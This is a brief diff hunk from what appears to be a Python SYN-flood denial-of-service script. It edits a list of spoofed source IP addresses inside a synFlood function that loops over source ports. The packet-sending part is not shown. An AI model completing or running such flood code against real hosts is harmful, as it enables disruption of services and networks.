@@ -10,7 +10,7 @@ dPort=80
 
 def synFlood(tgt,dPort):
 
-    srcList = ["1.2.3.1","1.2.3.2","1.2.3.3","1.2.3.4"]
+    srcList = ["1.2.3.3","1.2.3.2","1.2.3.3","1.2.3.4"]
 
     for sPort in range(1024,65535):
         index = random.randrange(4)
